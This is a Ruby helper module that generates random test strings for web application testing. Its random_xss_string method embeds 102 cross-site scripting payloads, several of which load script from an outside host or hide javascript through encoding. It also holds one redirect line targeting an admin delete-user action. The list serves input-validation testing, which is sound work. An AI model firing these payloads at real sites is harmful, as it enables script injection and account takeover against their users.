# coding: UTF-8
module StringFactory

  # A random string creator that draws from all printable ASCII characters
  # from 33 to 128. Default length is 10 characters.
  # @param length [Integer] The count of characters in the string
  # @param s [String] Typically this will be left blank, but if included, any string created will be prepended with s. Note that the string length will still be as specified
  def random_string(length=10, s="")
    length.enum_for(:times).inject(s) do |result, index|
      s << rand(93) + 33
    end
  end

  # A random string creator that draws from all printable ASCII and High ASCII characters
  # from 33 to 256. Default length is 10 characters.
  # @param length [Integer] The count of characters in the string
  # @param s [String] Typically this will be left blank, but if included, any string created will be prepended with s. Note that the string length will still be as specified
  def random_high_ascii(length=10, s="")
    length.enum_for(:times).inject(s) do |result, index|
      s << rand(223) + 33
    end
  end

  # A "friendlier" random string generator. No characters need to be escaped for valid URLs.
  # Uses no Reserved or "Unsafe" characters.
  # Also excludes the comma, the @ sign and the plus sign. Default length is 10 characters.
  def random_nicelink(length=10)
    chars = %w{a b c d e f g h j k m n p q r s t u v w x y z A B C D E F G H J K L M N P Q R S T U V W X Y Z 0 1 2 3 4 5 6 7 8 9 _ - .}
    (0...length).map { chars[rand(chars.size)]}.join
  end

  # Returns a string that is properly formatted like an email address.
  # The string returned defaults to 268 characters long.
  # @param x [Integer] This is not the length of the whole string, but only of the "name" portion of the email, minus 2.
  def random_email(x=62)
    x > 62 ? x=62 : x=x
    chars = %w{a b c d e f g h j k m n p q r s t u v w x y z A B C D E F G H J K L M N P Q R S T U V W X Y Z 0 1 2 3 4 5 6 7 8 9 ! # $ % & ' * + - / = ? ^ _ ` { | } ~}
    random_alphanums(1) + (0...x).map { chars[rand(chars.size)]}.join + random_alphanums(1) + "@" + random_alphanums(60) + ".com"
  end

  # A random string generator that uses all characters
  # available on an American Qwerty keyboard.
  # @param length [Integer] The count of characters in the string
  # @param s [String] Typically this will be left blank, but if included, any string created will be prepended with s. Note that the string length will still be as specified
  def random_alphanums_plus(length=10, s="")
    chars = %w{ a b c d e f g h j k m n p q r s t u v w x y z A B C D E F G H J K L M N P Q R S T U V W X Y Z 0 1 2 3 4 5 6 7 8 9 ` ~ ! @  # $% ^ & * ( ) _ + - = { } [ ] \ : " ; ' < > ? , . / }
    length.times { s << chars[rand(chars.size)] }
    s.to_s
  end

  # A random string generator that uses only letters and numbers in the string. Default length is 10 characters.
  # @param length [Integer] The count of characters in the string
  # @param s [String] Typically this will be left blank, but if included, any string created will be prepended with s. Note that the string length will still be as specified
  def random_alphanums(length=10, s="")
    chars = 'abcdefghjkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ0123456789'
    length.times { s << chars[rand(chars.size)] }
    s.to_s
  end

  # A random string generator that uses only lower case letters.
  # @param length [Integer] The count of characters in the string
  # @param s [String] Typically this will be left blank, but if included, any string created will be prepended with s. Note that the string length will still be as specified
  def random_letters(length=10, s="")
    chars = 'abcdefghjkmnpqrstuvwxyz'
    length.times { s << chars[rand(chars.size)] }
    s.to_s
  end

  # Returns a block of text (of the specified type, see below) containing
  # the specified number of "words" (each containing between 1 and 16 chars)
  # randomly spread across the specified number of lines (note that
  # the method does not allow the line count to be larger than
  # the word count and will "fix" it if it is).
  #
  # @param word_count [Integer] The count of "words" in the string, separated by spaces or line feeds. If no parameters are provided, the method will return two alphanumeric "words" on two lines.
  # @param line_count [Integer] The count of line feeds that will be randomly placed throughout the string
  # @param char_type [:symbol] Determines the character content
  # of the string.
  #
  # @example
  #
  #  :alpha => "Alphanumeric" - Uses the #random_alphanums method
  #  :string => uses the #random_string method, so chars 33 through 128 will be included
  #  :ascii => All ASCII chars from 33 to 256 are fair game -> uses #random_high_ascii
  def random_multiline(word_count=2, line_count=2, char_type=:alpha)
    char_methods = {:alpha=>"random_alphanums(rand(16)+1)", :string=>"random_string(rand(16)+1)", :ascii=>"random_high_ascii(rand(16)+1)"}
    if line_count > word_count
      line_count = word_count - 1
    end
    words = []
    non_words = []
    word_count.times { words << eval(char_methods[char_type]) } # creating the words, adding to the array
    (line_count - 1).times { non_words << "\n" } # adding the number of line feeds
    unless word_count==line_count
      (word_count - line_count - 1).times { non_words << " " } # adding the right number of spaces
    end
    non_words.shuffle! # Have to shuffle the line feeds around!
    array = words.zip(non_words)
    array.flatten!
    array.join("")
  end

  # Picks at random from the list of XSS test strings, using
  # the provided number as size of the list to choose from.
  # It will randomly pre-pend the string with HTML closing tags.
  #
  # The strings are organized by length, with the shorter ones
  # first. There are 102 strings.
  def random_xss_string(number=102)
    if number > 102
      number = 102
    end
    xss = ["<PLAINTEXT>", "\\\";alert('XSS');//", "'';!--\"<XSS>=&{()}", "<IMG SRC=\"mocha:alert('XSS')\">", "<BODY ONLOAD=alert('XSS')>", "<BODY ONLOAD =alert('XSS')>", "<BR SIZE=\"&{alert('XSS')}\">", "¼script¾alert(¢XSS¢)¼/script¾", "<IMG SRC=\"livescript:alert('XSS')\">", "<SCRIPT SRC=//ha.ckers.org/.j>", "<IMG SRC=javascript:alert('XSS')>", "<IMG SRC=JaVaScRiPt:alert('XSS')>", "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>", "<IMG SRC=\"javascript:alert('XSS')\"", "<IMG SRC='vbscript:msgbox(\"XSS\")'>", "<A HREF=\"http://1113982867/\">XSS</A>", "<IMG SRC=\"javascript:alert('XSS');\">", "<IMG SRC=\"jav\tascript:alert('XSS');\">", "<XSS STYLE=\"behavior: url(xss.htc);\">", "</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>", "<IMG DYNSRC=\"javascript:alert('XSS')\">", "<A HREF=\"http://66.102.7.147/\">XSS</A>", "<IMG LOWSRC=\"javascript:alert('XSS')\">", "<BGSOUND SRC=\"javascript:alert('XSS');\">", "<BASE HREF=\"javascript:alert('XSS');//\">", "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">", "<SCRIPT>a=/XSS/ alert(a.source)</SCRIPT>", "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">", "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">", "<XSS STYLE=\"xss:expression(alert('XSS'))\">", "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">", "<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>", "<IMG SRC=\" &#14; javascript:alert('XSS');\">", "<IMG SRC=javascript:alert(&quot;XSS&quot;)>", "<BODY BACKGROUND=\"javascript:alert('XSS')\">", "<TABLE BACKGROUND=\"javascript:alert('XSS')\">", "<DIV STYLE=\"width: expression(alert('XSS'));\">", "<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">", "<iframe src=http://ha.ckers.org/scriptlet.html <", "<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>", "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>", "<A HREF=\"http://0x42.0x0000066.0x7.0x93/\">XSS</A>", "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">", "<A HREF=\"http://0102.0146.0007.00000223/\">XSS</A>", "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>", "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "<SCRIPT SRC=\"http://ha.ckers.org/xss.jpg\"></SCRIPT>", "<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>", "<BODY onload!\#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>", "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">", "<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>", "<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>", "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "<? echo('<SCR)'; echo('IPT>alert(\"XSS\")</SCRIPT>'); ?>", "<SCRIPT =\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">", "<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "<LAYER SRC=\"http://ha.ckers.org/scriptlet.html\"></LAYER>", "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>", "<SCRIPT \"a='>'\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">", "<SCRIPT a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "<SCRIPT a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>", "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">", "perl -e 'print \"<SCR\\0IPT>alert(\\\"XSS\\\")</SCR\\0IPT>\";' > out", "<IMG SRC = \" j a v a s c r i p t : a l e r t ( ' X S S ' ) \" >", "Redirect 302 /a.jpg http://www.rsmart.com/admin.asp&deleteuser", "perl -e 'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";' > out", "<!--[if gte IE 4]> <SCRIPT>alert('XSS');</SCRIPT> <![endif]-->", "<DIV STYLE=\"background-image: url(&#1;javascript:alert('XSS'))\">", "<A HREF=\"http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\">XSS</A>", "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">", "a=\"get\"; b=\"URL(\\\"\"; c=\"javascript:\"; d=\"alert('XSS');\\\")\"; eval(a+b+c+d);", "<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>", "<EMBED SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"></EMBED>", "<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>", "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS", "<META HTTP-EQUIV=\"Link\" Content=\"<http://ha.ckers.org/xss.css>; REL=stylesheet\">", "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">", "<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>", "<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>", "<XML SRC=\"xsstest.xml\" ID=I></XML> <SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>", "<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\">", "exp/*<A STYLE='no\\xss:noxss(\"*//*\"); xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'>", "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">", "<!--#exec cmd=\"/bin/echo '<SCR'\"--><!--#exec cmd=\"/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'\"-->", "<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>", "<HTML xmlns:xss> <?import namespace=\"xss\" implementation=\"http://ha.ckers.org/xss.htc\"> <xss:xss>XSS</xss:xss> </HTML>", "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>", "<HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-", "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>", "<XML ID=I><X><C><![CDATA[<IMG SRC=\"javas]]><![CDATA[cript:alert('XSS');\">]]> </C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>", "<XML ID=\"xss\"><I><B>&lt;IMG SRC=\"javas<!-- -->cript:alert('XSS')\"&gt;</B></I></XML> <SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"></SPAN>", "<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\">", "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>", "';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>", "<HTML><BODY> <?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"> <?import namespace=\"t\" implementation=\"#default#time2\"> <t:set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\"> </BODY></HTML>", "<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>"]
    x = rand(4)
    case(x)
      when 0
        return xss[rand(number)]
      when 1
        return %|"| + xss[rand(number)]
      when 2
        return %|">| + xss[rand(number)]
      when 3
        return %|>| + xss[rand(number)]
    end

  end

  # Returns a random hex string that matches an HTML color value.
  def random_hex_color
    "#"+("%06x" % (rand * 0xffffff)).upcase
  end

end